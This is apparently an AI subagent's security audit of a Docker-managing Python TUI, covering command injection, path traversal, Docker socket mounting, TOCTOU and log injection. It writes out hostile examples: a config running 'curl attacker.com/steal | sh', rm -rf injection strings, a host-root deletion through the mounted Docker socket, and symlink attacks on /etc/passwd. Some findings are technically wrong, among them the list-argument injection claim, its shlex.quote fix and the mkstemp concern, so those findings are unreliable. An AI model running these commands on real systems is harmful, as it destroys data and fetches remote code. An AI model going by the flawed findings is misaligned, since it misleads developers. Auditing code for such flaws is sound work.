# SECURITY AUDIT REPORT: openhands.py

**File:** /home/node/.openclaw/workspace/openhands/openhands.py  
**Lines:** ~12,300  
**Type:** TUI for Docker container management and code execution  
**Audit Date:** 2026-02-06  
**Auditor:** Security Subagent (Red Team Analysis)

---

## EXECUTIVE SUMMARY

This codebase manages Docker containers and executes arbitrary code with minimal input validation. **Multiple CRITICAL and HIGH severity vulnerabilities** were identified, primarily around command injection, path traversal, and unsafe user input handling. The application runs Docker commands with user-controlled data that can lead to container escape, host compromise, and remote code execution.

---

## CRITICAL VULNERABILITIES

### 1. COMMAND INJECTION IN Docker.exec_in_container() - CRITICAL

**Location:** Line ~4630-4645, `Docker.exec_in_container()` method

**Vulnerable Code:**
```python
@staticmethod
def exec_in_container(name: str, command: str, timeout: int = 60) -> Tuple[int, str]:
    """Execute command in container."""
    try:
        result = subprocess.run(
            ["docker", "exec", name, "bash", "-c", command],  # UNSAFE: command is raw string
            capture_output=True, text=True, timeout=timeout
        )
        return result.returncode, result.stdout + result.stderr
```

**Attack Vector:**  
Any user-controlled input passed to `exec_in_container()` can inject shell commands.

**Exploitation Steps:**
1. Create a project with a malicious name containing shell metacharacters: `test; cat /etc/passwd`
2. The project name flows into container operations via `project.container_name`
3. Multiple code paths execute commands like:
   ```python
   Docker.exec_in_container(name, f"test -f {setup_marker} && echo 'done'")
   ```
4. If `name` contains `; rm -rf / #`, the executed command becomes:
   ```
   docker exec test; rm -rf / # bash -c "test -f ..."
   ```

**Impact:** Full host compromise, arbitrary code execution as user running the TUI.

**Fix:** Always use `shlex.quote()` for dynamic values:
```python
from shlex import quote
quoted_name = quote(name)
code, output = Docker.exec_in_container(quoted_name, command, timeout=5)
```

---

### 2. COMMAND INJECTION IN MCP_GATEWAY_SCRIPT - CRITICAL

**Location:** Lines ~277-310, `MCP_GATEWAY_SCRIPT` template

**Vulnerable Code:**
```bash
for server in $servers; do
    cmd=$(jq -r --arg s "$server" '.mcpServers[$s].command // empty' "$MCP_SERVERS")
    args=$(jq -r --arg s "$server" '.mcpServers[$s].args // [] | .[]' "$MCP_SERVERS" | tr '\n' ' ')
    
    if [ -z "$cmd" ]; then
        continue
    fi
    
    full_cmd="$cmd $args"  # UNSAFE: Direct interpolation
    nohup supergateway --stdio "$full_cmd" --port $port > /tmp/gateway_$server.log 2>&1 &
```

**Attack Vector:**  
The `mcp_servers.json` config file values are directly interpolated into shell commands without validation or quoting.

**Exploitation Steps:**
1. Attacker crafts malicious `mcp_servers.json`:
```json
{
  "mcpServers": {
    "evil": {
      "command": "sh",
      "args": ["-c", "curl attacker.com/steal | sh"]
    }
  }
}
```
2. When `MCP_GATEWAY_SCRIPT` executes, `full_cmd` becomes:
   ```
   sh -c curl attacker.com/steal | sh
   ```
3. This executes inside the container with potential container escape via Docker socket access.

**Impact:** Container compromise, potential host escape via mounted Docker socket.

**Fix:** Use arrays and proper quoting:
```bash
readarray -t args < <(jq -r --arg s "$server" '.mcpServers[$s].args // [] | .[]' "$MCP_SERVERS")
nohup supergateway --stdio "$cmd" "${args[@]}" --port $port > /tmp/gateway_$(basename "$server").log 2>&1 &
```

---

### 3. PATH TRAVERSAL IN Docker.write_file() - CRITICAL

**Location:** Lines ~4680-4695

**Vulnerable Code:**
```python
@staticmethod
def write_file(container: str, path: str, content: str) -> bool:
    """Write content to file in container."""
    encoded = base64.b64encode(content.encode()).decode()
    code, _ = Docker.exec_in_container(
        container,
        f"echo '{encoded}' | base64 -d > '{path}'",  # UNSAFE: path not validated
        timeout=10
    )
    return code == 0
```

**Attack Vector:**  
The `path` parameter is directly interpolated into a shell command without validation.

**Exploitation Steps:**
1. Attacker provides path: `/etc/passwd' || rm -rf /etc/shadow #'`
2. Command becomes:
   ```
   echo '...' | base64 -d > '/etc/passwd' || rm -rf /etc/shadow #''
   ```
3. This corrupts `/etc/passwd` and deletes `/etc/shadow`.

**Impact:** Container filesystem corruption, privilege escalation within container.

**Fix:** 
1. Validate path is within allowed directory:
```python
@staticmethod
def write_file(container: str, path: str, content: str, base_dir: str = "/workspace") -> bool:
    # Resolve and validate path
    resolved = os.path.normpath(path)
    if not resolved.startswith(base_dir):
        logger.error(f"Path traversal attempt: {path}")
        return False
    encoded = base64.b64encode(content.encode()).decode()
    quoted_path = shlex.quote(resolved)
    # ... rest of method
```

---

### 4. CONTAINER ESCAPE VIA DOCKER SOCKET MOUNTING - CRITICAL

**Location:** Lines ~4720-4750, `create_persistent_container()`

**Vulnerable Code:**
```python
cmd = [
    "docker", "create",
    "--name", name,
    "-v", "/var/run/docker.sock:/var/run/docker.sock",  # DANGEROUS
    "-v", f"{project.config_dir}:/root",
    "-v", f"{project.workspace}:/workspace",
    # ...
    RUNTIME_IMAGE,
    "sleep", "infinity"
]
```

**Attack Vector:**  
The Docker socket is mounted into every container. Any code running inside the container can control the host's Docker daemon.

**Exploitation Steps:**
1. Attacker gains code execution inside container (via malicious dependency, task description, etc.)
2. From inside container:
   ```bash
   docker run --rm -v /:/host alpine rm -rf /host/etc
   ```
3. This creates a new container with host root mounted and destroys the host filesystem.

**Impact:** Complete host compromise.

**Fix:** 
Options (in order of preference):
1. **Don't mount Docker socket** - Use Docker-in-Docker or rootless Podman
2. Use Docker socket proxy with restricted permissions
3. Run containers in rootless mode with user namespaces

---

## HIGH SEVERITY VULNERABILITIES

### 5. COMMAND INJECTION IN TestEnforcement.run_tests() - HIGH

**Location:** Lines ~3000-3050

**Vulnerable Code:**
```python
docker_cmd = [
    'docker', 'exec', '-w', '/workspace',
    self.container_name,
    'bash', '-c',
    f'export PATH="/root/.cargo/bin:/root/.local/bin:$PATH" && {test_cmd}'  # test_cmd is user-influenced
]
```

**Attack Vector:**  
The `test_cmd` is constructed from detected framework but isn't validated, and user workspace contents can influence detection.

**Exploitation Steps:**
1. Attacker creates a fake `pytest.ini` in workspace
2. Creates a malicious `pyproject.toml` with embedded commands
3. The framework detection could be tricked into executing arbitrary commands

**Fix:** Whitelist allowed test commands, don't construct commands from filesystem contents.

---

### 6. TOCTOU IN ATOMIC FILE OPERATIONS - HIGH

**Location:** Lines ~1080-1120, `atomic_write()`

**Vulnerable Code:**
```python
def atomic_write(filepath: Path, content: str, backup: bool = True) -> bool:
    import tempfile
    filepath = Path(filepath)
    backup_path = filepath.with_suffix(filepath.suffix + '.bak') if backup else None
    
    try:
        filepath.parent.mkdir(parents=True, exist_ok=True)
        
        fd, tmp_path = tempfile.mkstemp(dir=filepath.parent, suffix='.tmp')
        try:
            with os.fdopen(fd, 'w', encoding='utf-8') as f:
                f.write(content)
                f.flush()
                os.fsync(f.fileno())
            
            # Backup existing file if requested
            if backup and filepath.exists():  # TOCTOU: check and use
                try:
                    if backup_path.exists():
                        backup_path.unlink()
                    filepath.rename(backup_path)  # TOCTOU: another process could modify filepath
                except Exception:
                    pass
            
            os.rename(tmp_path, filepath)  # Atomic rename
            return True
```

**Attack Vector:**  
Time-of-check to time-of-use race conditions allow attackers to swap files between check and use operations.

**Exploitation Steps:**
1. Attacker creates symlink: `ln -s /etc/critical_file target_file.bak`
2. Between the `exists()` check and `rename()`, attacker swaps target
3. File is written to unintended location

**Fix:** Use `O_NOFOLLOW` and operate on file descriptors directly:
```python
def atomic_write_secure(filepath: Path, content: str) -> bool:
    # Open with O_NOFOLLOW to prevent symlink attacks
    fd = os.open(filepath.parent, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
    try:
        tmp_fd, tmp_path = tempfile.mkstemp(dir=filepath.parent, suffix='.tmp')
        # ... write and fsync ...
        os.rename(tmp_path, filepath.name, dir_fd=fd)  # Atomic relative to dir_fd
    finally:
        os.close(fd)
```

---

### 7. LOG INJECTION IN RalphManager.add_progress_entry() - HIGH

**Location:** Multiple logging functions

**Vulnerable Code:**
```python
def add_progress_entry(self, iteration: int, message: str):
    """Add entry to progress files via Docker."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    # Write to git-tracked PROGRESS.md
    important_keywords = ['TASK_DONE', 'VERIFIED', 'STUCK', 'FIX', 'Starting', 'Complete', 'Error']
    is_important = any(kw in message for kw in important_keywords)
    
    if is_important:
        self._append_file("PROGRESS.md", f"- [{timestamp}] Iter {iteration}: {message}\n")
```

**Attack Vector:**  
`message` parameter is user-controlled (from task descriptions, git commits, etc.) and injected into log files without sanitization.

**Exploitation Steps:**
1. Attacker sets task description to: `Normal work\n\n- [00:00:00] Iter 999: BACKDOOR_INSTALLED`
2. Log file now contains forged entry suggesting legitimate activity
3. Attacker uses this for audit trail poisoning, covering tracks

**Fix:** Sanitize all log inputs:
```python
import html
def sanitize_log(message: str) -> str:
    # Remove newlines to prevent log injection
    return html.escape(message).replace('\n', ' ').replace('\r', '')
```

---

### 8. CREDENTIAL EXPOSURE IN LOGS - HIGH

**Location:** Lines ~5030-5080, `ensure_container_running()`

**Vulnerable Code:**
```python
validate_cmd = (
    "cat " + check_path + "/agent_settings.json | python3 -c '\n"
    "import sys, json\n"
    "try:\n"
    "    d = json.load(sys.stdin)\n"
    "    llm = d.get(\"llm\", {})\n"
    "    model = llm.get(\"model\", \"\")\n"
    "    api_key = llm.get(\"api_key\", \"\")\n"  # API key in validation output!
    "    errors = []\n"
    # ...
)
```

**Attack Vector:**  
API keys are extracted and potentially logged during validation.

**Impact:** Credential leakage in logs accessible to anyone with container access.

**Fix:** Never extract or log sensitive credentials:
```python
# Only check existence, never extract value
validate_cmd = (
    "cat " + shlex.quote(check_path) + "/agent_settings.json | python3 -c '\n"
    "import sys, json\n"
    "d = json.load(sys.stdin)\n"
    "llm = d.get(\"llm\", {})\n"
    "has_model = bool(llm.get(\"model\"))\n"
    "has_key = bool(llm.get(\"api_key\"))\n"  # Only check boolean presence
    # ...
)
```

---

### 9. SYMLINK ATTACK IN safe_write_text() - HIGH

**Location:** Lines ~1130-1150

**Vulnerable Code:**
```python
def safe_write_text(filepath: Path, content: str, backup: bool = False) -> bool:
    filepath = Path(filepath)
    try:
        filepath.parent.mkdir(parents=True, exist_ok=True)
        return atomic_write(filepath, content, backup=backup)  # Follows symlinks!
```

**Attack Vector:**  
No verification that the target is a regular file (not a symlink).

**Exploitation Steps:**
1. Attacker creates symlink: `ln -s /etc/passwd target_file`
2. `safe_write_text()` follows symlink and overwrites `/etc/passwd`

**Fix:** Check for symlinks before writing:
```python
def safe_write_text(filepath: Path, content: str, backup: bool = False) -> bool:
    filepath = Path(filepath)
    
    # Prevent symlink attacks
    if filepath.is_symlink() or (filepath.exists() and not filepath.is_file()):
        log_error(f"Refusing to write to non-regular file: {filepath}")
        return False
    
    # Also check parent directories
    for parent in filepath.parents:
        if parent.is_symlink():
            log_error(f"Path contains symlink: {parent}")
            return False
    
    filepath.parent.mkdir(parents=True, exist_ok=True)
    return atomic_write(filepath, content, backup=backup)
```

---

### 10. ENVIRONMENT VARIABLE INJECTION - HIGH

**Location:** Lines ~2770-2800, MCP warmup and install scripts

**Vulnerable Code:**
```python
MCP_WARMUP_SCRIPT = '''
export PATH="/root/.local/bin:/root/.cargo/bin:$PATH"
MCP_SERVERS="/root/.openhands/mcp_servers.json"
UV_TOOLS="/root/.local/share/uv/tools"

if [ ! -f "$MCP_SERVERS" ]; then
    echo "  No mcp_servers.json found, skipping warmup"
    exit 0
fi

# Check if jq is available
if ! command -v jq &>/dev/null; then
    echo "  jq not found, installing..."
    apt-get update -qq && apt-get install -y -qq jq 2>/dev/null || true
fi
'''
```

**Attack Vector:**  
Scripts use environment variables that can be manipulated by malicious containers or prior executions.

**Exploitation Steps:**
1. Attacker controls `MCP_SERVERS` env var by creating a malicious parent process
2. Script reads attacker-controlled file
3. JSON parsing may execute arbitrary commands via crafted jq expressions

**Fix:** Use hardcoded paths or validate environment variables:
```python
MCP_WARMUP_SCRIPT = '''
# Use hardcoded paths, not environment variables
MCP_SERVERS="/root/.openhands/mcp_servers.json"
UV_TOOLS="/root/.local/share/uv/tools"

# Validate path is not a symlink
if [ -L "$MCP_SERVERS" ]; then
    echo "ERROR: MCP_SERVERS is a symlink, possible attack"
    exit 1
fi
'''
```

---

## MEDIUM SEVERITY VULNERABILITIES

### 11. UNSAFE INPUT IN project name validation - MEDIUM

**Location:** Lines ~160-180

**Vulnerable Code:**
```python
def validate_project_name(name: str) -> Tuple[bool, str]:
    """Validate project name for safety in systemd, cron, filesystem, and Docker."""
    if not name:
        return False, "Project name cannot be empty"
    if len(name) > 64:
        return False, "Project name too long (max 64 characters)"
    if not VALID_PROJECT_NAME_PATTERN.match(name):
        return False, "Project name can only contain letters, numbers, underscores, and hyphens"
    # ...
```

**Issue:**  
The pattern `^[a-zA-Z0-9][a-zA-Z0-9_-]*$` is good, but the validated name is later used in shell contexts without `shlex.quote()` in many places.

---

### 12. PRIVILEGE ESCALATION VIA CONTAINER CAPABILITIES - MEDIUM

**Location:** Container creation (no explicit capabilities dropped)

**Issue:**  
Containers are created without dropping capabilities or setting security options:
- No `--cap-drop=ALL`
- No `--security-opt=no-new-privileges`
- No user namespace remapping

**Impact:** Container escape is easier if any process gains elevated privileges.

**Fix:**
```python
cmd = [
    "docker", "create",
    "--name", name,
    "--cap-drop=ALL",  # Drop all capabilities
    "--cap-add=CHOWN",  # Only add what's needed
    "--security-opt=no-new-privileges:true",
    "--user", "1000:1000",  # Run as non-root
    # ...
]
```

---

### 13. INFORMATION DISCLOSURE VIA ERROR MESSAGES - MEDIUM

**Location:** Various exception handlers

**Vulnerable Code:**
```python
def _show_daemon_failure(self, p: Project, ralph, error_msg: str):
    self.app.call_from_thread(self.add_log, f"{error_msg}!", "error")
    _, log_output = Docker.exec_in_container(
        p.container_name,
        "tail -15 /workspace/.ralph/ralph_daemon.log 2>/dev/null || echo '(no log)'",
        timeout=5
    )
    for line in log_output.strip().split("\n")[:10]:
        self.app.call_from_thread(self.add_log, f"  {line}")
```

**Issue:**  
Error messages may leak sensitive information about the system, file paths, or configuration.

---

### 14. INSECURE TEMPORARY FILE CREATION - MEDIUM

**Location:** Lines ~1100

**Issue:**  
`tempfile.mkstemp()` is used, but the temp file path could potentially be predicted and raced.

**Fix:** Use `uuid` for truly unpredictable names (already partially done but not everywhere).

---

## LOW SEVERITY VULNERABILITIES

### 15. HARDCODED SECRETS/CONFIGURATION - LOW

**Location:** Throughout the codebase

**Issue:**  
Hardcoded paths like `/root/.openhands/`, hardcoded URLs like `docker.openhands.dev`.

---

### 16. MISSING INPUT LENGTH LIMITS - LOW

**Location:** Various user input handlers

**Issue:**  
Task descriptions and other inputs don't have strict length limits, potentially causing DoS.

---

## RECOMMENDATIONS

### Immediate Actions (CRITICAL)

1. **Audit all `subprocess` calls** - Ensure all user-controlled inputs use `shlex.quote()`
2. **Remove Docker socket mounting** - Use alternative approaches like Docker-in-Docker
3. **Implement path traversal validation** - All file operations must validate paths
4. **Add symlink protection** - Check for symlinks before file operations

### Short-term Actions (HIGH)

1. **Implement defense in depth** - Add AppArmor/SELinux profiles for containers
2. **Sanitize all log inputs** - Prevent log injection attacks
3. **Use file descriptor-based operations** - Prevent TOCTOU races
4. **Run containers as non-root** - Implement proper user namespacing

### Long-term Actions (MEDIUM/LOW)

1. **Implement comprehensive input validation** - Strict schemas for all inputs
2. **Add security headers and sandboxing** - Restrict container capabilities
3. **Regular security audits** - Automated scanning for vulnerabilities
4. **Implement least privilege** - Separate processes for different operations

---

## CONCLUSION

The openhands.py codebase has **serious security vulnerabilities** that could lead to complete system compromise. The combination of:
- Docker socket mounting
- Command injection vulnerabilities  
- Path traversal issues
- Missing input sanitization

Creates a high-risk environment where malicious user input or compromised containers can escape to the host system.

**Priority: IMMEDIATE REMEDIATION REQUIRED**

---

*Report generated by OpenClaw Security Subagent*  
*Classification: CONFIDENTIAL - For authorized personnel only*
